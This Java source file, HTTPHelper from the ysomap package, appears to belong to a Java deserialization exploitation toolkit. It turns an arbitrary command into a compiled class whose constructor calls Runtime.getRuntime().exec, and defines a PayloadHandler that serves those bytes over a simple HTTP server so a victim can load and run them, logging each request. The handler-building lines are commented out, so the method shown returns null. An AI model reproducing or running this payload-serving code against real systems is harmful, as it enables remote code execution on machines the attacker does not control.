package ysomap.core.util;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.util.Map;

/**
 * @author wh1t3P1g
 * @since 2020/2/17
 */
public class HTTPHelper {

    public static HttpServer makeSimpleHTTPServer(int port, Map<String, HttpHandler> paths) throws IOException {
        HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);
        for(Map.Entry<String, HttpHandler> path: paths.entrySet()){
            server.createContext(path.getKey(), path.getValue());
        }
        server.setExecutor(null);
        return server;
    }

    public static HttpHandler makeHTTPHandler(String filename, String body) throws Exception {
        HttpHandler handler = null;
        if(body.startsWith("code:")){
            body = body.substring(5);
        }else{
            body = "java.lang.Runtime.getRuntime().exec(\"" +
                    body.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                    "\");";
        }

        byte[] obj = ClassFiles.makeClassWithDefaultConstructor(
                filename.replace(".class",""), body);

//        if(filename.endsWith(".class")){
//            handler = new PayloadHandler(obj);
//        }else if(filename.endsWith(".jar")){
//            handler = new PayloadHandler(
//                    ClassFiles.makeJarFile(filename, obj));
//        }
        return handler;
    }


    public static class PayloadHandler implements HttpHandler {

        private byte[] obj;

        public PayloadHandler(byte[] obj) throws Exception {
            this.obj = obj;
        }

        @Override
        public void handle(HttpExchange exchange) throws IOException {
            System.err.println("Have request from "+exchange.getRemoteAddress());
            System.err.println("Get request <"+exchange.getRequestMethod()+"> "+exchange.getRequestURI());
            exchange.sendResponseHeaders(200, obj.length);
            OutputStream os = exchange.getResponseBody();
            os.write(obj);
            os.close();
            System.err.println("return payload and close");
        }
    }
}
